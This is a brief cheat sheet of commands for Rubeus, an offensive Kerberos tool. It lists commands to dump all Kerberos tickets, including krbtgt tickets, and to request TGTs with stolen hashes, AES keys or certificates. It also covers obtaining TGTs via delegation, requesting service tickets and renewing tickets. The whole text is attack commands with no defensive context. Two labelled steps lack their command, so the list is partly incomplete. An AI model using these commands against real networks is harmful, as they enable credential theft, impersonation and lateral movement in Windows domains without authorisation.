[X] Rubeus Command List

[\] Rubeus.exe
[/] Show help menu

[\] Rubeus.exe triage
[/] Quick overview of Kerberos tickets on system

[\] Rubeus.exe dump
[/] Dump all Kerberos tickets

[\] Rubeus.exe dump /service:krbtgt
[/] Dump only KRBTGT‑related tickets

[\] Rubeus.exe klist
[/] List current Kerberos tickets

[\] Rubeus.exe purge
[/] Purge all Kerberos tickets

[/] Request a TGT via delegation

[\] Rubeus.exe tgtdeleg /nowrap
[/] Request TGT without base64 wrapping

[/] Request a TGT using NTLM hash

[\] Rubeus.exe asktgt /user:USER /aes256:HASH
[/] Request a TGT using AES256 key

[\] Rubeus.exe asktgt /domain:DOMAIN /user:USER /certificate:cert.pfx
[/] Request TGT using PKINIT (certificate)

[\] Rubeus.exe asktgs /ticket:TGT.kirbi /service:cifs/server
[/] Request TGS for a service

[\] Rubeus.exe renew /ticket:TGT.kirbi
[/] Renew an existing TGT
